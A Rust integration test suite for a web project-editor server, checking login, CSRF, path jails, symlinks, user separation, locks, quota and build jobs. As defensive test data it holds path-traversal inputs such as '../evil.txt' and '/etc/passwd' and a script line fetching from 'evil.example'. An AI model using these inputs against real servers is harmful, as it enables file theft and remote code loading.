//! Integration tests: a real server on an ephemeral port, driven over HTTP (path jail, auth, CSRF, locks, quota, jobs).
use nord_editor_server::{hash_password, router, AuthMode, Config};
use reqwest::{Client, Method, StatusCode};
use std::{collections::HashMap, path::Path, time::Duration};

struct Srv {
    base: String,
    dir: tempfile::TempDir,
    c: Client,
}

async fn start(f: impl FnOnce(&mut Config)) -> Srv {
    let dir = tempfile::tempdir().unwrap();
    let mut cfg = Config::new(dir.path().join("ws"));
    cfg.auth = AuthMode::Token("test-token-123456".into());
    f(&mut cfg);
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", l.local_addr().unwrap());
    tokio::spawn(async move { axum::serve(l, router(cfg)).await.unwrap() });
    Srv { base, dir, c: Client::new() }
}

impl Srv {
    fn req(&self, m: Method, path: &str, cookie: &str) -> reqwest::RequestBuilder {
        let mut r = self.c.request(m, format!("{}{path}", self.base)).header("x-nord", "1");
        if !cookie.is_empty() {
            r = r.header("cookie", cookie);
        }
        r
    }
    async fn login_with(&self, body: &str) -> Option<String> {
        let r = self.req(Method::POST, "/api/login", "").header("content-type", "application/json").body(body.to_string()).send().await.unwrap();
        if r.status() != StatusCode::OK {
            return None;
        }
        let c = r.headers().get("set-cookie").unwrap().to_str().unwrap().to_string();
        assert!(c.contains("HttpOnly") && c.contains("SameSite=Strict"), "{c}");
        Some(c.split(';').next().unwrap().to_string())
    }
    async fn login(&self) -> String {
        self.login_with(r#"{"token":"test-token-123456"}"#).await.expect("login")
    }
    async fn put(&self, ck: &str, project: &str, path: &str, body: &str) -> StatusCode {
        self.req(Method::PUT, &format!("/api/p/{project}/file?path={path}"), ck).body(body.to_string()).send().await.unwrap().status()
    }
    async fn new_project(&self, ck: &str, name: &str) {
        let r = self.req(Method::POST, "/api/projects", ck).body(format!(r#"{{"name":"{name}","kind":"2d"}}"#)).send().await.unwrap();
        assert_eq!(r.status(), StatusCode::CREATED);
    }
}

fn files_outside(ws: &Path) -> Vec<String> {
    // nothing may ever appear next to the workspace folder
    let parent = ws.parent().unwrap();
    std::fs::read_dir(parent).unwrap().flatten().map(|e| e.file_name().to_string_lossy().into_owned()).filter(|n| n != "ws").collect()
}

#[tokio::test]
async fn login_is_required_and_csrf_header_enforced() {
    let s = start(|_| {}).await;
    assert_eq!(s.req(Method::GET, "/api/projects", "").send().await.unwrap().status(), StatusCode::UNAUTHORIZED);
    let ping: serde_json::Value = serde_json::from_str(&s.req(Method::GET, "/api/ping", "").send().await.unwrap().text().await.unwrap()).unwrap();
    assert_eq!(ping["auth"], "token");
    assert_eq!(ping["authed"], false);
    assert!(s.login_with(r#"{"token":"wrong"}"#).await.is_none());
    let ck = s.login().await;
    assert_eq!(s.req(Method::GET, "/api/projects", &ck).send().await.unwrap().status(), StatusCode::OK);
    // bearer token works too
    let r = s.c.get(format!("{}/api/projects", s.base)).header("authorization", "Bearer test-token-123456").send().await.unwrap();
    assert_eq!(r.status(), StatusCode::OK);
    // a state-changing request without x-nord is refused even with a valid cookie
    let r = s.c.post(format!("{}/api/projects", s.base)).header("cookie", &ck).body(r#"{"name":"x"}"#).send().await.unwrap();
    assert_eq!(r.status(), StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn project_files_round_trip() {
    let s = start(|_| {}).await;
    let ck = s.login().await;
    s.new_project(&ck, "My Game").await;
    assert_eq!(s.put(&ck, "My%20Game", "scripts/a.js", "export const x = 1;").await, StatusCode::NO_CONTENT);
    let got = s.req(Method::GET, "/api/p/My%20Game/file?path=scripts/a.js", &ck).send().await.unwrap().text().await.unwrap();
    assert_eq!(got, "export const x = 1;");
    let tree = s.req(Method::GET, "/api/p/My%20Game/tree", &ck).send().await.unwrap().text().await.unwrap();
    assert!(tree.contains("scripts/a.js") && tree.contains("nord.project.json"), "{tree}");
    let r = s.req(Method::POST, "/api/p/My%20Game/rename", &ck).body(r#"{"from":"scripts/a.js","to":"scripts/b/c.js"}"#).send().await.unwrap();
    assert_eq!(r.status(), StatusCode::NO_CONTENT);
    assert_eq!(s.req(Method::GET, "/api/p/My%20Game/file?path=scripts/a.js", &ck).send().await.unwrap().status(), StatusCode::NOT_FOUND);
    assert_eq!(s.req(Method::DELETE, "/api/p/My%20Game/file?path=scripts", &ck).send().await.unwrap().status(), StatusCode::NO_CONTENT);
    let z = s.req(Method::GET, "/api/p/My%20Game/download.zip", &ck).send().await.unwrap().bytes().await.unwrap();
    assert_eq!(&z[..2], b"PK");
    // deleting a project needs the confirm header
    assert_eq!(s.req(Method::DELETE, "/api/p/My%20Game", &ck).send().await.unwrap().status(), StatusCode::PRECONDITION_REQUIRED);
    let r = s.req(Method::DELETE, "/api/p/My%20Game", &ck).header("x-nord-confirm", "My Game").send().await.unwrap();
    assert_eq!(r.status(), StatusCode::NO_CONTENT);
}

#[tokio::test]
async fn path_traversal_is_refused_everywhere() {
    let s = start(|_| {}).await;
    let ck = s.login().await;
    s.new_project(&ck, "p").await;
    let evil = ["../evil.txt", "..%2Fevil.txt", "%2e%2e/evil.txt", "a/../../evil.txt", "/etc/passwd", "a%5C..%5Cevil.txt", "a//b", ".git/config", ".nord-cache/x", "a%00b"];
    for e in evil {
        let st = s.put(&ck, "p", e, "pwned").await;
        assert_eq!(st, StatusCode::BAD_REQUEST, "PUT {e}");
        let st = s.req(Method::GET, &format!("/api/p/p/file?path={e}"), &ck).send().await.unwrap().status();
        assert!(st == StatusCode::BAD_REQUEST || st == StatusCode::NOT_FOUND, "GET {e}: {st}");
    }
    // project names are validated too
    for name in ["..", "..%2Fp", ".hidden", "a%2Fb", "%2e%2e"] {
        let st = s.req(Method::GET, &format!("/api/p/{name}/tree"), &ck).send().await.unwrap().status();
        assert!(matches!(st, StatusCode::BAD_REQUEST | StatusCode::NOT_FOUND), "{name}: {st}");
    }
    let r = s.req(Method::POST, "/api/p/p/rename", &ck).body(r#"{"from":"nord.project.json","to":"../stolen.json"}"#).send().await.unwrap();
    assert_eq!(r.status(), StatusCode::BAD_REQUEST);
    let r = s.req(Method::POST, "/api/projects", &ck).body(r#"{"name":"../x","kind":"2d"}"#).send().await.unwrap();
    assert_eq!(r.status(), StatusCode::BAD_REQUEST);
    assert!(files_outside(&s.dir.path().join("ws")).is_empty(), "something was written outside the workspace");
    assert!(!s.dir.path().join("ws/local").exists());
    // static route: no escaping the web folder either
    let r = s.c.get(format!("{}/..%2f..%2fetc/passwd", s.base)).send().await.unwrap();
    assert!(matches!(r.status(), StatusCode::BAD_REQUEST | StatusCode::NOT_FOUND));
}

#[cfg(unix)]
#[tokio::test]
async fn symlinks_inside_a_project_are_not_followed() {
    let s = start(|_| {}).await;
    let ck = s.login().await;
    s.new_project(&ck, "p").await;
    let proj = s.dir.path().join("ws/admin/p");
    let secret = s.dir.path().join("secret.txt");
    std::fs::write(&secret, "top secret").unwrap();
    std::os::unix::fs::symlink(&secret, proj.join("link.txt")).unwrap();
    std::os::unix::fs::symlink(s.dir.path(), proj.join("dir")).unwrap();
    assert_eq!(s.req(Method::GET, "/api/p/p/file?path=link.txt", &ck).send().await.unwrap().status(), StatusCode::BAD_REQUEST);
    assert_eq!(s.put(&ck, "p", "dir/x.txt", "x").await, StatusCode::BAD_REQUEST);
    assert!(!s.dir.path().join("x.txt").exists());
    let tree = s.req(Method::GET, "/api/p/p/tree", &ck).send().await.unwrap().text().await.unwrap();
    assert!(!tree.contains("\"path\":\"link.txt\"") && !tree.contains("\"path\":\"dir\""), "{tree}");
}

#[tokio::test]
async fn users_have_separate_workspaces() {
    let mut users = HashMap::new();
    users.insert("ann".to_string(), hash_password("ann-password").unwrap());
    users.insert("bob".to_string(), hash_password("bob-password").unwrap());
    let s = start(|c| c.auth = AuthMode::Users(users)).await;
    assert!(s.login_with(r#"{"user":"ann","password":"nope"}"#).await.is_none());
    assert!(s.login_with(r#"{"user":"../ann","password":"ann-password"}"#).await.is_none());
    let ann = s.login_with(r#"{"user":"ann","password":"ann-password"}"#).await.unwrap();
    let bob = s.login_with(r#"{"user":"bob","password":"bob-password"}"#).await.unwrap();
    s.new_project(&ann, "secret").await;
    let list = |ck: String| {
        let s = &s;
        async move { s.req(Method::GET, "/api/projects", &ck).send().await.unwrap().text().await.unwrap() }
    };
    assert!(list(ann.clone()).await.contains("secret"));
    assert!(!list(bob.clone()).await.contains("secret"));
    assert_eq!(s.req(Method::GET, "/api/p/secret/tree", &bob).send().await.unwrap().status(), StatusCode::NOT_FOUND);
    assert_eq!(s.put(&bob, "secret", "x.txt", "x").await, StatusCode::NOT_FOUND);
    // the shared-token bearer does not exist in users mode
    let r = s.c.get(format!("{}/api/projects", s.base)).header("authorization", "Bearer anything").send().await.unwrap();
    assert_eq!(r.status(), StatusCode::UNAUTHORIZED);
}

#[tokio::test]
async fn one_writer_per_project_and_quota() {
    let s = start(|c| c.quota_bytes = 40_000).await;
    let (a, b) = (s.login().await, s.login().await);
    s.new_project(&a, "p").await;
    assert_eq!(s.req(Method::POST, "/api/p/p/lock", &a).send().await.unwrap().status(), StatusCode::OK);
    assert_eq!(s.req(Method::POST, "/api/p/p/lock", &b).send().await.unwrap().status(), StatusCode::LOCKED);
    assert_eq!(s.put(&b, "p", "x.txt", "x").await, StatusCode::LOCKED);
    assert_eq!(s.put(&a, "p", "x.txt", "x").await, StatusCode::NO_CONTENT);
    s.req(Method::DELETE, "/api/p/p/lock", &a).send().await.unwrap();
    assert_eq!(s.put(&b, "p", "y.txt", "y").await, StatusCode::NO_CONTENT);
    let big = "z".repeat(60_000);
    assert_eq!(s.put(&b, "p", "big.bin", &big).await, StatusCode::INSUFFICIENT_STORAGE);
}

#[tokio::test]
async fn jobs_check_offline_and_rust_refusal() {
    let s = start(|_| {}).await;
    let ck = s.login().await;
    s.new_project(&ck, "p").await;
    s.put(&ck, "p", "scripts/a.js", "fetch('https://evil.example/x.js')").await;
    let r = s.req(Method::POST, "/api/p/p/jobs/check-offline", &ck).send().await.unwrap();
    assert_eq!(r.status(), StatusCode::ACCEPTED);
    let id = serde_json::from_str::<serde_json::Value>(&r.text().await.unwrap()).unwrap()["job"].as_str().unwrap().to_string();
    let mut st = serde_json::Value::Null;
    for _ in 0..50 {
        let t = s.req(Method::GET, &format!("/api/p/p/jobs/{id}/status"), &ck).send().await.unwrap().text().await.unwrap();
        st = serde_json::from_str(&t).unwrap();
        if st["status"] != "running" {
            break;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    assert_eq!(st["status"], "failed", "{st}");
    assert!(st["lines"].to_string().contains("evil.example"), "{st}");
    // another user's job id is invisible
    assert_eq!(s.req(Method::GET, "/api/p/other/jobs/zzz/status", &ck).send().await.unwrap().status(), StatusCode::NOT_FOUND);
    // unknown kinds and Rust builds are refused
    assert_eq!(s.req(Method::POST, "/api/p/p/jobs/format-disk", &ck).send().await.unwrap().status(), StatusCode::NOT_FOUND);
    s.req(Method::POST, "/api/projects", &ck).body(r#"{"name":"rusty","kind":"wasm-game"}"#).send().await.unwrap();
    let r = s.req(Method::POST, "/api/p/rusty/jobs/export", &ck).send().await.unwrap();
    assert_eq!(r.status(), StatusCode::FORBIDDEN);
}

#[cfg(unix)]
#[tokio::test]
async fn export_job_streams_log_downloads_zip_and_can_be_cancelled() {
    use std::os::unix::fs::PermissionsExt;
    let dir = tempfile::tempdir().unwrap();
    // a stand-in for the `nord` CLI: prints, then writes <out>.zip; "slow" projects sleep
    let fake = dir.path().join("nord");
    std::fs::write(
        &fake,
        "#!/bin/sh\nproj=\"$2\"\nout=\"\"\nwhile [ $# -gt 0 ]; do if [ \"$1\" = \"--out\" ]; then out=\"$2\"; fi; shift; done\necho building\nif [ -f \"$proj/slow.flag\" ]; then sleep 30; fi\nprintf 'PKfake' > \"$out.zip\"\necho done\n",
    )
    .unwrap();
    std::fs::set_permissions(&fake, std::fs::Permissions::from_mode(0o755)).unwrap();
    let s = start(|c| {
        c.nord_bin = Some(fake.clone());
        c.job_timeout = Duration::from_secs(3);
    })
    .await;
    let ck = s.login().await;
    s.new_project(&ck, "p").await;
    let r = s.req(Method::POST, "/api/p/p/jobs/export", &ck).body(r#"{"minify":true}"#).send().await.unwrap();
    let id = serde_json::from_str::<serde_json::Value>(&r.text().await.unwrap()).unwrap()["job"].as_str().unwrap().to_string();
    let mut st = serde_json::Value::Null;
    for _ in 0..100 {
        st = serde_json::from_str(&s.req(Method::GET, &format!("/api/p/p/jobs/{id}/status"), &ck).send().await.unwrap().text().await.unwrap()).unwrap();
        if st["status"] != "running" {
            break;
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    assert_eq!(st["status"], "done", "{st}");
    assert!(st["lines"].to_string().contains("building"));
    let z = s.req(Method::GET, &format!("/api/p/p/jobs/{id}/download"), &ck).send().await.unwrap().bytes().await.unwrap();
    assert_eq!(&z[..], b"PKfake");
    // a slow export can be cancelled, and is stopped at the time limit
    s.put(&ck, "p", "slow.flag", "1").await;
    let start_job = || async {
        let r = s.req(Method::POST, "/api/p/p/jobs/export", &ck).send().await.unwrap();
        serde_json::from_str::<serde_json::Value>(&r.text().await.unwrap()).unwrap()["job"].as_str().unwrap().to_string()
    };
    let status = |id: String| {
        let (s, ck) = (&s, ck.clone());
        async move { serde_json::from_str::<serde_json::Value>(&s.req(Method::GET, &format!("/api/p/p/jobs/{id}/status"), &ck).send().await.unwrap().text().await.unwrap()).unwrap() }
    };
    let id = start_job().await;
    tokio::time::sleep(Duration::from_millis(400)).await;
    assert_eq!(status(id.clone()).await["status"], "running");
    assert_eq!(s.req(Method::DELETE, &format!("/api/p/p/jobs/{id}"), &ck).send().await.unwrap().status(), StatusCode::ACCEPTED);
    tokio::time::sleep(Duration::from_millis(600)).await;
    assert_eq!(status(id).await["status"], "cancelled");
    let id = start_job().await;
    tokio::time::sleep(Duration::from_secs(4)).await;
    let st = status(id).await;
    assert_eq!(st["status"], "failed", "{st}");
    assert!(st["lines"].to_string().contains("limit"), "{st}");
}
